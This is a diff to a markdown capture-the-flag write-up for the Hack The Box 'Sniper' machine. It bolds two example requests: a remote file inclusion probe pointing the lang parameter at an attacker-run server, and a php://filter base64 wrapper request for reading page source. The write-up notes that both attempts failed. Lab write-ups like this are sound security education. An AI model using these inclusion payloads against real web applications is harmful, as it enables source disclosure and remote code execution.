@@ -171,7 +171,7 @@ so it loads different php page for every language!, So maybe we can test for **R
     - Send a request to our server.
     - check our server log to see if we get any requests from the server.
 
-    the request will be something like http://10.10.10.151/blog/?lang=http://<ip>:<port>/anyfile
+    the request will be something like **http://10.10.10.151/blog/?lang=http://ip:port/anyfile**
 
     Unfortunately, we didn't get any request from the server and the sniper server returned 404.
 
@@ -183,7 +183,7 @@ so it loads different php page for every language!, So maybe we can test for **R
 
     Using this method we try to get the source code of a page using something called **wrappers.** I will try using PHP wrapper you can search for other wrappers.
 
-    the request will http://sniper.htb/blog/?lang=pHp://FilTer/convert.base64-encode/resource=blog-en.php ,the request will try to encode the source code of blog-en.php to base64 and send it back.
+    the request will **http://sniper.htb/blog/?lang=pHp://FilTer/convert.base64-encode/resource=blog-en.php** ,the request will try to encode the source code of blog-en.php to base64 and send it back.
 
     but also this method fails.
 
